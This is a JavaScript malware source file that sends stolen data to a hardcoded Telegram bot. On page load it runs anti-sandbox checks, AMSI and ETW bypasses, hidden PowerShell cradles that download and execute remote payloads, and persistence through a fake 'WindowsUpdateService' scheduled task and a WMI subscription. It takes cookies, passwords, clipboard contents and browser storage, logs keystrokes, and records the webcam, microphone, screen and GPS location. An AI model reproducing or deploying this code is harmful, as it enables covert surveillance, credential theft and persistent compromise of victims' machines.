// ============================================================
// G-KH-INJECTED ULTIMATE EDITION v4.0 - ADVANCED STEALTH
// ALL FEATURES + TELEGRAM EXFIL + NO C2
// ============================================================

var BOT_TOKEN = '7568763554:AAGCzHXRI677ZyDsCkWpwS_RX8eRsQ60FaU';
var CHAT_ID = '6837307356';

// ==================== ANTI-SANDBOX ====================
function antiSandbox() {
    var startTime = Date.now();
    while (Date.now() - startTime < 5000) { /* busy wait */ }
    
    var checks = [
        navigator.hardwareConcurrency < 2,
        navigator.deviceMemory < 4,
        navigator.platform.indexOf('Win') === -1,
        screen.width < 1024 || screen.height < 768,
        !!navigator.webdriver,
        navigator.plugins.length === 0,
        /VMware|VirtualBox|QEMU|KVM|Hyper-V|Parallels/i.test(navigator.userAgent)
    ];
    if (checks.filter(Boolean).length > 3) {
        sendToTelegram('[ANTI-SANDBOX] Sandbox detected, sleeping...');
        var until = Date.now() + 600000;
        while (Date.now() < until) { /* busy wait */ }
        return false;
    }
    return true;
}

// ==================== AMSI / ETW BYPASS ====================
function amsiBypass() {
    var ps = `
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null);
    `;
    runPS(ps);
}

function etwBypass() {
    var ps = `
        $p = [System.Diagnostics.Process]::GetCurrentProcess();
        $m = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE($p.MainModule);
        $w = [System.Runtime.InteropServices.Marshal]::ReadInt32($m, 0x3C);
        $o = [System.Runtime.InteropServices.Marshal]::ReadInt32($m, $w + 0x88);
        [System.Runtime.InteropServices.Marshal]::WriteInt32($m, $o + 0x18, 0);
    `;
    runPS(ps);
}

// ==================== OBFUSCATION ====================
function obfuscate(code) {
    var r = '';
    for (var i = 0; i < code.length; i++) {
        var c = code.charCodeAt(i);
        if (c >= 65 && c <= 90) r += String.fromCharCode(((c - 65 + 13) % 26) + 65);
        else if (c >= 97 && c <= 122) r += String.fromCharCode(((c - 97 + 13) % 26) + 97);
        else r += code[i];
    }
    return r;
}

// ==================== POLYMORPHIC PAYLOAD ====================
function polymorphicPayload() {
    var payloads = [
        'Invoke-Expression (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/abc123")',
        'Invoke-Expression (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/raw/def456")',
        'Invoke-Expression (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/ghi789")'
    ];
    var chosen = payloads[Math.floor(Math.random() * payloads.length)];
    var enc = btoa(chosen);
    runPS('powershell -NoP -NonI -W Hidden -Enc ' + enc);
}

// ==================== TELEGRAM EXFIL ====================
function sendToTelegram(data, isFile, fileType, fileName) {
    var delay = Math.floor(Math.random() * 3000) + 1000;
    setTimeout(function() {
        try {
            if (isFile) {
                var fd = new FormData();
                var blob = new Blob([data], {type: fileType});
                fd.append('chat_id', CHAT_ID);
                fd.append('document', blob, fileName || 'capture.dat');
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendDocument', true);
                xhr.send(fd);
            } else {
                var xhr = new XMLHttpRequest();
                var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
                var params = 'chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(data);
                xhr.open('POST', url, true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(params);
            }
        } catch(e) {}
    }, delay);
}

// ==================== KEYLOGGER ====================
function startKeylogger() {
    var keys = '';
    document.addEventListener('keydown', function(e) {
        keys += e.key;
        if (keys.length > 100) {
            sendToTelegram('[KEYLOG] ' + obfuscate(keys));
            keys = '';
        }
    });
    setInterval(function() {
        if (keys.length > 0) {
            sendToTelegram('[KEYLOG] ' + obfuscate(keys));
            keys = '';
        }
    }, 30000);
}

// ==================== WEBCAM ====================
function captureWebcam() {
    try {
        navigator.mediaDevices.getUserMedia({video: true})
        .then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            var canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            var ctx = canvas.getContext('2d');
            setTimeout(function() {
                ctx.drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(function(blob) {
                    var reader = new FileReader();
                    reader.onload = function() {
                        sendToTelegram(reader.result, true, 'image/jpeg', 'webcam.jpg');
                    };
                    reader.readAsArrayBuffer(blob);
                }, 'image/jpeg');
                stream.getTracks().forEach(function(t) { t.stop(); });
            }, 2000);
        }).catch(function(e) {
            sendToTelegram('[WEBCAM ERROR] ' + e.message);
        });
    } catch(e) {}
}

// ==================== GPS ====================
function trackGPS() {
    try {
        navigator.geolocation.watchPosition(function(pos) {
            var loc = 'Lat: ' + pos.coords.latitude + ', Lon: ' + pos.coords.longitude;
            loc += ', Acc: ' + pos.coords.accuracy + 'm';
            sendToTelegram('[GPS] ' + loc);
        }, function(err) {
            sendToTelegram('[GPS ERROR] ' + err.message);
        }, {enableHighAccuracy: true, timeout: 5000});
    } catch(e) {}
}

// ==================== SCREEN RECORDING ====================
function startScreenRecording() {
    try {
        navigator.mediaDevices.getDisplayMedia({video: true, audio: true})
        .then(function(stream) {
            var mr = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp9'});
            var chunks = [];
            mr.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
            mr.onstop = function() {
                var blob = new Blob(chunks, {type: 'video/webm'});
                var reader = new FileReader();
                reader.onload = function() {
                    sendToTelegram(reader.result, true, 'video/webm', 'screen.webm');
                };
                reader.readAsArrayBuffer(blob);
                stream.getTracks().forEach(function(t) { t.stop(); });
            };
            mr.start();
            setTimeout(function() { if (mr.state === 'recording') mr.stop(); }, 30000);
        }).catch(function(e) {
            sendToTelegram('[SCREEN ERROR] ' + e.message);
        });
    } catch(e) {}
}

// ==================== MICROPHONE ====================
function startMicRecording() {
    try {
        navigator.mediaDevices.getUserMedia({audio: true})
        .then(function(stream) {
            var mr = new MediaRecorder(stream, {mimeType: 'audio/webm;codecs=opus'});
            var chunks = [];
            mr.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
            mr.onstop = function() {
                var blob = new Blob(chunks, {type: 'audio/webm'});
                var reader = new FileReader();
                reader.onload = function() {
                    sendToTelegram(reader.result, true, 'audio/webm', 'mic.webm');
                };
                reader.readAsArrayBuffer(blob);
                stream.getTracks().forEach(function(t) { t.stop(); });
            };
            mr.start();
            setTimeout(function() { if (mr.state === 'recording') mr.stop(); }, 30000);
        }).catch(function(e) {
            sendToTelegram('[MIC ERROR] ' + e.message);
        });
    } catch(e) {}
}

// ==================== DATA THEFT ====================
function stealCookies() {
    var c = document.cookie;
    if (c) sendToTelegram('[COOKIES] ' + obfuscate(c));
}

function stealPasswords() {
    var inputs = document.querySelectorAll('input[type="password"]');
    var p = '';
    inputs.forEach(function(inp) { if (inp.value) p += inp.value + '|'; });
    if (p) sendToTelegram('[PASSWORDS] ' + obfuscate(p));
}

function stealClipboard() {
    try {
        navigator.clipboard.readText().then(function(text) {
            if (text) sendToTelegram('[CLIPBOARD] ' + obfuscate(text));
        }).catch(function(){});
    } catch(e) {}
}

function stealLocalStorage() {
    try {
        var d = '';
        for (var key in localStorage) {
            if (localStorage.hasOwnProperty(key)) d += key + '=' + localStorage[key] + '\n';
        }
        if (d) sendToTelegram('[LOCALSTORAGE] ' + obfuscate(d));
    } catch(e) {}
}

function stealSessionStorage() {
    try {
        var d = '';
        for (var key in sessionStorage) {
            if (sessionStorage.hasOwnProperty(key)) d += key + '=' + sessionStorage[key] + '\n';
        }
        if (d) sendToTelegram('[SESSIONSTORAGE] ' + obfuscate(d));
    } catch(e) {}
}

function stealBrowserInfo() {
    var info = 'UA: ' + navigator.userAgent + '\n';
    info += 'Platform: ' + navigator.platform + '\n';
    info += 'Lang: ' + navigator.language + '\n';
    info += 'Screen: ' + screen.width + 'x' + screen.height + '\n';
    info += 'TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone;
    sendToTelegram('[BROWSERINFO] ' + info);
}

// ==================== PowerShell EXECUTOR ====================
function runPS(cmd) {
    var enc = btoa(cmd);
    try {
        var shell = new ActiveXObject('WScript.Shell');
        shell.Run('powershell -NoP -NonI -W Hidden -Enc ' + enc, 0, false);
    } catch(e) {}
}

// ==================== PERSISTENCE ====================
function advancedPersistence() {
    var ps = `
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -NonI -W Hidden -Enc $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Invoke-Expression (New-Object Net.WebClient).DownloadString(''https://pastebin.com/raw/payload'')")))';
        $trigger = New-ScheduledTaskTrigger -AtStartup;
        Register-ScheduledTask -TaskName 'WindowsUpdateService' -Action $action -Trigger $trigger -User 'SYSTEM' -RunLevel Highest;
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='WinUpdate'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"};
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name='WinUpdateConsumer'; CommandLineTemplate="powershell -NoP -NonI -W Hidden -Enc $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Invoke-Expression (New-Object Net.WebClient).DownloadString(''https://pastebin.com/raw/payload'')')))"};
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer};
    `;
    runPS(ps);
}

// ==================== AUTO-UPDATE ====================
function autoUpdate() {
    var ps = `
        while ($true) {
            $ver = Invoke-WebRequest -Uri 'https://pastebin.com/raw/version' -UseBasicParsing;
            if ($ver.Content -ne (Get-Content "$env:TEMP\\ver.txt")) {
                Invoke-WebRequest -Uri 'https://pastebin.com/raw/payload.ps1' -OutFile "$env:TEMP\\up.ps1";
                powershell -File "$env:TEMP\\up.ps1";
                $ver.Content | Out-File "$env:TEMP\\ver.txt";
            }
            Start-Sleep -Seconds 3600;
        }
    `;
    runPS(ps);
}

// ==================== MAIN ====================
window.onload = function() {
    if (!antiSandbox()) return;
    
    amsiBypass();
    etwBypass();
    polymorphicPayload();
    advancedPersistence();
    autoUpdate();
    
    setTimeout(function() {
        stealCookies();
        stealPasswords();
        stealClipboard();
        stealLocalStorage();
        stealSessionStorage();
        stealBrowserInfo();
        trackGPS();
        startScreenRecording();
        startMicRecording();
        captureWebcam();
        startKeylogger();
    }, 3000);
};